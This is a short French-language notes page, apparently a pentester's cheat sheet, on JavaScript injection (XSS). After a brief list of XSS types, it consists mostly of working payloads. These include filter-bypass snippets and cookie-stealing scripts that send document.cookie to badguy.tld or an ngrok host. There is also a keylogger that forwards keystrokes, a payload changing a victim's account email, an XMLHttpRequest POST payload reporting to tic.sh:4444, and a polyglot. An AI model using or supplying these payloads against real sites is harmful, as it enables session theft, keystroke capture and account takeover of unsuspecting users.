---
title: "Injections Javascript"
---

<p style="text-align: right">_- last update 11/03/2022 -_</p>

Il y à plein de type différents d'xss:

* _reflected_: on peut injecter sur sa page (par les param GET par exemple)
* _stored_: l'xss est stocké dans la base et est peristante
* _dom based_: l'xss vient d'un élément qui est injecter depuis la page (chat)
* _blind_: on ne peux pas vérifier l'execution de l'xss ([voir xsshunter](https://xsshunter.com/))

**TIPS:** ça peut être très pratique d'encoder les données à extraire en base64

Examples de payload:

Pour être sure que le payload se joue, il vaut mieux utiliser une iframe:
```html
<iframe src="javascript:alert('xss')">
```

Quand le mot `script` est filtré:
```html
<img src="valid.img" width=0 height=0 onload="alert('xss')"/>
```

Utilisant fetch
```html
<script>fetch('https://badguy.tld/steal?cookie=' + btoa(document.cookie));</script>
```

Utilisant une image si fetch à été bloqué
```html
<script>document.write('<img src="https://...ngrok.io?' + btoa(document.cookie) + '"/>')</script>
```

Implémentant un keylogger:
```html
<script>document.onkeypress = function(e) { fetch('https://badguy.tld/log?key=' + btoa(e.key) );}</script>
```

Appeler une fonction déjà présente dans le site qui s'executera avec les
privilèges (cookies/autres) de la victime:
```html
<script>user.changeEmail('attacker@badguy.tld');</script>
```

Si jamais la cible n'est pas compatible avec [fetch](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) 
mais qu'il faut faire un POST depuis son navigateur, on peut étendre le dernier 
payload avec [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest):

```html
<script>
  var urlTarget = "...";
  var dataTarget = "key=value&key2=value2";
  var logHost = "tic.sh:4444";
  function reqSuccess () {
    document.write('<img src="http://' + logHost + '?state=OK&date=' + Date.now() + '"/>');
  }
  function reqFailure () {
    document.write('<img src="http://' + logHost + '?state=KO&date=' + Date.now() + '"/>');
  }
  var oReq = new XMLHttpRequest();
  oReq.addEventListener("load", reqSuccess);
  oReq.addEventListener("error", reqFailure);
  oReq.open("POST", urlTarget);
  oReq.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  oReq.send(dataTarget);
  document.write('<img src="http://' + logHost + '?state=done&date=' + Date.now() + '"/>');
</script>
```

Pour finir un polyglot cool:
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```
